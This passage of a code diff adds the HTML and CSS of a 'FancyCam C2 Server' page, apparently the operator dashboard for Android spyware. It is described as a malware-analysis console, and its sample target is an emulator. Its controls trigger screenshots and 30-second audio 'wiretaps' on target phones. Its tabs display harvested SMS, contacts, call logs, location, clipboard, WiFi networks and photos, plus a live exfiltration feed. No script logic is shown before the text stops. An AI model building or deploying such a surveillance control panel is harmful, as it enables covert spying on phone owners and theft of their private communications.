@@ -1,0 +1,2059 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FancyCam C2 - Forensic Intelligence Dashboard</title>
+    <style>
+        :root {
+            --bg-base: #0a0c10;
+            --bg-surface: #12161f;
+            --bg-card: #181d28;
+            --bg-elevated: #1e2433;
+            --border: #262f40;
+            --border-light: #344055;
+            --accent: #e94560;
+            --accent-glow: rgba(233, 69, 96, 0.25);
+            --accent-hover: #ff5470;
+            --success: #00ff88;
+            --success-glow: rgba(0, 255, 136, 0.2);
+            --warning: #ffb830;
+            --info: #38bdf8;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background: var(--bg-base);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-base); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+        /* Top Header */
+        header.top-nav {
+            background: linear-gradient(180deg, #161b26 0%, #10141d 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .brand-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-title {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: var(--text-primary);
+        }
+
+        .brand-subtitle {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .status-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.25);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--success);
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 8px var(--success);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+
+        .btn-refresh {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            color: var(--text-primary);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-refresh:hover {
+            border-color: var(--accent);
+            background: rgba(233, 69, 96, 0.1);
+            color: #fff;
+        }
+
+        .auto-refresh-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        /* Workspace 2-Column Layout */
+        .workspace-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            height: calc(100vh - 58px);
+        }
+
+        /* MINIMIZED LEFT SIDEBAR: Device Switcher */
+        aside.device-sidebar {
+            width: 270px;
+            min-width: 250px;
+            max-width: 290px;
+            background: var(--bg-surface);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .sidebar-header {
+            padding: 14px 16px 10px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .sidebar-header-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .sidebar-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+        }
+
+        .target-count-badge {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 10px;
+        }
+
+        .device-search-input {
+            width: 100%;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+        }
+
+        .device-search-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .device-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        /* Device Switcher Card */
+        .device-item-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .device-item-card:hover {
+            border-color: var(--border-light);
+            background: var(--bg-elevated);
+        }
+
+        .device-item-card.active {
+            border-color: var(--accent);
+            background: rgba(233, 69, 96, 0.08);
+            box-shadow: 0 0 12px rgba(233, 69, 96, 0.15);
+        }
+
+        .device-item-card.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: var(--accent);
+        }
+
+        .device-icon-box {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .device-item-card.active .device-icon-box {
+            border-color: var(--accent);
+            background: rgba(233, 69, 96, 0.15);
+        }
+
+        .device-online-dot {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            border: 2px solid var(--bg-card);
+        }
+
+        .device-info-box {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .device-item-name {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .device-item-sub {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .device-item-id {
+            font-size: 10px;
+            color: var(--text-muted);
+            font-family: var(--font-mono);
+            margin-top: 2px;
+        }
+
+        .sidebar-footer {
+            padding: 10px 14px;
+            border-top: 1px solid var(--border);
+            background: var(--bg-surface);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        /* RIGHT MAIN CONTENT */
+        main.main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            background: var(--bg-base);
+        }
+
+        /* TOP SECTION ABOVE TABS: Operations & Payload Bar */
+        .c2-operations-bar {
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            flex-wrap: wrap;
+            flex-shrink: 0;
+        }
+
+        .bar-left-controls {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .active-target-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 6px 12px;
+            border-radius: 6px;
+        }
+
+        .active-target-pill strong {
+            color: var(--text-primary);
+        }
+
+        .active-target-pill code {
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--info);
+        }
+
+        .payload-selector-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .select-payload-dropdown {
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            color: var(--text-primary);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-family: var(--font-mono);
+            cursor: pointer;
+            min-width: 240px;
+        }
+
+        .select-payload-dropdown:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .bar-right-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-c2-action {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-light);
+            color: var(--text-primary);
+            padding: 7px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-c2-action:hover {
+            border-color: var(--accent);
+            background: rgba(233, 69, 96, 0.15);
+            color: #fff;
+        }
+
+        .action-status-pill {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            min-width: 100px;
+            text-align: center;
+        }
+
+        /* Tab Navigation Bar */
+        nav.tab-bar {
+            display: flex;
+            background: #0f121a;
+            border-bottom: 1px solid var(--border);
+            padding: 0 16px;
+            overflow-x: auto;
+            flex-shrink: 0;
+            scrollbar-width: thin;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            padding: 12px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 3px solid transparent;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-primary);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .tab-btn.active {
+            color: var(--accent);
+            border-bottom-color: var(--accent);
+            background: rgba(233, 69, 96, 0.05);
+        }
+
+        .tab-count {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 10px;
+            transition: all 0.2s;
+        }
+
+        .tab-btn.active .tab-count {
+            background: var(--accent);
+            border-color: var(--accent);
+            color: #fff;
+        }
+
+        /* Tab Content Panes */
+        .tab-panes {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .tab-pane {
+            display: none;
+            animation: fadeIn 0.2s ease-in-out;
+        }
+
+        .tab-pane.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cards & Containers */
+        .content-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 14px 18px;
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .card-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-body {
+            padding: 18px;
+        }
+
+        .target-tag {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        .badge-btn {
+            background: rgba(56, 189, 248, 0.15);
+            color: var(--info);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 4px;
+            padding: 2px 8px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .badge-btn:hover {
+            background: var(--info);
+            color: #000;
+        }
+
+        /* Stats Grid (Overview Tab) */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .stat-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.15);
+        }
+
+        .stat-card .stat-icon {
+            font-size: 20px;
+            margin-bottom: 6px;
+        }
+
+        .stat-card .stat-number {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-primary);
+            line-height: 1;
+        }
+
+        .stat-card .stat-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        /* Filter / Search Bar */
+        .filter-input {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            color: var(--text-primary);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            min-width: 200px;
+        }
+
+        .filter-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        /* Tables */
+        .table-responsive {
+            overflow-x: auto;
+        }
+
+        table.cyber-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        table.cyber-table th {
+            background: var(--bg-surface);
+            text-align: left;
+            padding: 12px 14px;
+            color: var(--text-secondary);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        table.cyber-table td {
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-primary);
+            vertical-align: middle;
+        }
+
+        table.cyber-table tr:hover td {
+            background: rgba(233, 69, 96, 0.04);
+        }
+
+        /* Tags */
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .tag-incoming { background: rgba(0, 255, 136, 0.15); color: var(--success); border: 1px solid rgba(0, 255, 136, 0.3); }
+        .tag-outgoing { background: rgba(56, 189, 248, 0.15); color: var(--info); border: 1px solid rgba(56, 189, 248, 0.3); }
+        .tag-missed { background: rgba(233, 69, 96, 0.15); color: var(--accent); border: 1px solid rgba(233, 69, 96, 0.3); }
+        .tag-wifi { background: rgba(255, 184, 48, 0.15); color: var(--warning); border: 1px solid rgba(255, 184, 48, 0.3); }
+
+        /* Event Feed */
+        .event-feed-list {
+            max-height: 380px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .event-row {
+            padding: 10px 14px;
+            border-left: 3px solid var(--accent);
+            background: var(--bg-surface);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            font-size: 13px;
+        }
+
+        .event-row.event-json { border-left-color: var(--info); }
+        .event-row.event-screenshot { border-left-color: var(--warning); }
+        .event-row.event-audio { border-left-color: var(--success); }
+        .event-row.event-action { border-left-color: var(--accent); }
+
+        .event-main {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+        }
+
+        .event-time {
+            color: var(--text-muted);
+            font-size: 11px;
+            font-family: var(--font-mono);
+            min-width: 65px;
+        }
+
+        .event-type-badge {
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            padding: 2px 6px;
+            border-radius: 3px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+        }
+
+        .event-text {
+            color: var(--text-primary);
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-muted);
+        }
+
+        .empty-icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+            opacity: 0.5;
+        }
+
+        /* Media Grids */
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 14px;
+        }
+
+        .screenshot-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .screenshot-thumb-wrap {
+            height: 180px;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .screenshot-thumb {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            transition: transform 0.2s;
+        }
+
+        .screenshot-thumb-wrap:hover .screenshot-thumb {
+            transform: scale(1.03);
+        }
+
+        .screenshot-meta {
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+            border-top: 1px solid var(--border);
+        }
+
+        .audio-item-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .audio-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+        }
+
+        .audio-player audio {
+            width: 100%;
+            height: 36px;
+            outline: none;
+        }
+
+        /* Raw JSON Viewer */
+        pre.json-viewer {
+            background: #080a0f;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: #7dd3fc;
+            max-height: 600px;
+            overflow: auto;
+            line-height: 1.5;
+        }
+
+        .btn-copy {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            color: var(--text-primary);
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .btn-copy:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        /* Modal for Installed Apps */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-overlay.open { display: flex; }
+
+        .modal-container {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 620px;
+            max-height: 85vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+        }
+
+        .modal-header {
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .modal-title { font-size: 15px; font-weight: 700; }
+        .modal-close {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .modal-close:hover { color: #fff; }
+
+        .modal-body {
+            padding: 18px;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .app-list {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 10px;
+        }
+
+        .app-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-family: var(--font-mono);
+            color: var(--text-secondary);
+        }
+
+        /* Lightbox Image Preview Modal */
+        #lightbox-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            cursor: pointer;
+        }
+
+        #lightbox-modal.open { display: flex; }
+        #lightbox-modal img {
+            max-width: 90vw;
+            max-height: 90vh;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+        }
+
+        @media (max-width: 960px) {
+            .workspace-layout {
+                flex-direction: column;
+                height: auto;
+            }
+            aside.device-sidebar {
+                width: 100%;
+                max-width: 100%;
+                border-right: none;
+                border-bottom: 1px solid var(--border);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Navigation -->
+    <header class="top-nav">
+        <div class="brand-area">
+            <div>
+                <div class="brand-title">FancyCam C2 Server</div>
+                <div class="brand-subtitle">Android Security & Malware Analysis Control Center</div>
+            </div>
+        </div>
+        <div class="header-actions">
+            <label class="auto-refresh-label">
+                <input type="checkbox" id="auto-refresh-check" checked onchange="toggleAutoRefresh(this.checked)">
+                Auto-Refresh (5s)
+            </label>
+            <div class="status-pill">
+                <div class="pulse-dot"></div>
+                <span id="c2-status-text">C2 ONLINE</span>
+            </div>
+            <button class="btn-refresh" onclick="loadAll()">
+                <span>🔄</span> Refresh
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Workspace -->
+    <div class="workspace-layout">
+
+        <!-- MINIMIZED LEFT COLUMN: Device Switcher -->
+        <aside class="device-sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-header-row">
+                    <span class="sidebar-title">Target Devices</span>
+                    <span class="target-count-badge" id="devices-count-badge">0 Online</span>
+                </div>
+                <input type="text" class="device-search-input" placeholder="Filter targets..." oninput="filterDeviceList(this.value)">
+            </div>
+
+            <!-- List of Devices -->
+            <div class="device-list" id="device-switcher-list">
+                <div class="empty-state" style="padding: 24px 10px;">
+                    <div class="empty-icon">⏳</div>
+                    <div style="font-size: 11px;">Scanning for targets...</div>
+                </div>
+            </div>
+
+            <div class="sidebar-footer">
+                <span>Targets detected</span>
+                <button class="btn-refresh" style="padding: 3px 8px; font-size: 10px;" onclick="loadDevices()">Scan</button>
+            </div>
+        </aside>
+
+        <!-- RIGHT COLUMN: Operations Bar, Tab Navigation & Panes -->
+        <main class="main-content">
+
+            <!-- SECTION ON TOP OF TABS: Target Selector & C2 Action Items -->
+            <div class="c2-operations-bar">
+                <div class="bar-left-controls">
+                    <div class="active-target-pill">
+                        <div class="pulse-dot"></div>
+                        <span>Target:</span>
+                        <strong id="bar-target-name">Android SDK built for x86_64</strong>
+                        <code id="bar-target-id">ff4330ffa39f3995</code>
+                    </div>
+
+                    <div class="payload-selector-wrapper">
+                        <span>📦 Dumps:</span>
+                        <select id="payload-select" class="select-payload-dropdown" onchange="switchPayload(this.value)">
+                            <option value="latest">Latest Received Dump</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="bar-right-actions">
+                    <button class="btn-c2-action" onclick="triggerAction('screenshot')">
+                        <span>📸 Capture Screenshot</span>
+                    </button>
+                    <button class="btn-c2-action" onclick="triggerAction('audio')">
+                        <span>🎙️ Wiretap Audio (30s)</span>
+                    </button>
+                    <span class="action-status-pill" id="action-status">Idle</span>
+                </div>
+            </div>
+
+            <!-- Tab Navigation Bar -->
+            <nav class="tab-bar">
+                <button class="tab-btn active" onclick="switchTab('tab-overview')">
+                    <span>📊</span> Overview
+                    <span class="tab-count" id="count-events">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-sms')">
+                    <span>💬</span> SMS Messages
+                    <span class="tab-count" id="count-sms">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-contacts')">
+                    <span>👥</span> Contacts
+                    <span class="tab-count" id="count-contacts">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-calllogs')">
+                    <span>📞</span> Call Logs
+                    <span class="tab-count" id="count-calls">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-location')">
+                    <span>📍</span> Location
+                    <span class="tab-count" id="count-locations">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-wifi')">
+                    <span>📶</span> WiFi Networks
+                    <span class="tab-count" id="count-wifi">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-clipboard')">
+                    <span>📋</span> Clipboard
+                    <span class="tab-count" id="count-clipboard">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-audio')">
+                    <span>🎙️</span> Audio Wiretaps
+                    <span class="tab-count" id="count-audio">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-media')">
+                    <span>🖼️</span> Screenshots & Photos
+                    <span class="tab-count" id="count-screens">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-raw')">
+                    <span>📄</span> Raw JSON
+                </button>
+            </nav>
+
+            <!-- Tab Content Panes -->
+            <div class="tab-panes">
+
+                <!-- 1. OVERVIEW TAB -->
+                <div class="tab-pane active" id="tab-overview">
+
+                    <!-- Target Device Information Card -->
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title">
+                                <span>📱</span> Target Device Information
+                            </div>
+                            <span class="target-tag">ONLINE TARGET</span>
+                        </div>
+                        <div class="card-body">
+                            <div style="display: flex; align-items: center; gap: 16px; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border);">
+                                <div style="width: 52px; height: 52px; border-radius: 10px; background: linear-gradient(135deg, rgba(233, 69, 96, 0.2), rgba(56, 189, 248, 0.2)); border: 1px solid var(--border-light); display: flex; align-items: center; justify-content: center; font-size: 26px;">
+                                    📱
+                                </div>
+                                <div>
+                                    <div style="font-size: 18px; font-weight: 700; color: var(--text-primary);" id="overview-dev-model">Android SDK built for x86_64</div>
+                                    <div style="font-size: 13px; color: var(--accent); font-weight: 600; text-transform: uppercase; margin-top: 3px;" id="overview-dev-brand">GOOGLE / GOOGLE</div>
+                                </div>
+                            </div>
+                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 12px;">
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Android ID</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-android-id">ff4330ffa39f3995</div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">OS Version</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-os-version">Android 10 (API 29)</div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Manufacturer</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-manufacturer">Google</div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Hardware</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-hardware">ranchu</div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Carrier / SIM</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--info); font-weight: 600; margin-top: 4px;" id="overview-dev-carrier">T-Mobile</div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Installed Apps</div>
+                                    <div style="margin-top: 4px;">
+                                        <button class="badge-btn" onclick="openAppsModal()">
+                                            <span id="overview-dev-apps-count">180</span> packages
+                                        </button>
+                                    </div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Last Sync</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-last-sync">-</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Metrics Cards -->
+                    <div class="stats-grid">
+                        <div class="stat-card" onclick="switchTab('tab-raw')">
+                            <div class="stat-icon">📦</div>
+                            <div class="stat-number" id="stat-json">0</div>
+                            <div class="stat-label">JSON Payloads</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-sms')">
+                            <div class="stat-icon">💬</div>
+                            <div class="stat-number" id="stat-sms">0</div>
+                            <div class="stat-label">SMS Harvested</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-contacts')">
+                            <div class="stat-icon">👥</div>
+                            <div class="stat-number" id="stat-contacts">0</div>
+                            <div class="stat-label">Contacts</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-calllogs')">
+                            <div class="stat-icon">📞</div>
+                            <div class="stat-number" id="stat-calls">0</div>
+                            <div class="stat-label">Call Logs</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-audio')">
+                            <div class="stat-icon">🎙️</div>
+                            <div class="stat-number" id="stat-audio">0</div>
+                            <div class="stat-label">Audio Intercepts</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-media')">
+                            <div class="stat-icon">📸</div>
+                            <div class="stat-number" id="stat-screenshots">0</div>
+                            <div class="stat-label">Photos & Screens</div>
+                        </div>
+                    </div>
+
+                    <!-- Live Event Feed -->
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title">
+                                <span>⚡</span> Live Exfiltration Activity Feed
+                            </div>
+                            <button class="btn-refresh" onclick="loadEvents()">Refresh Feed</button>
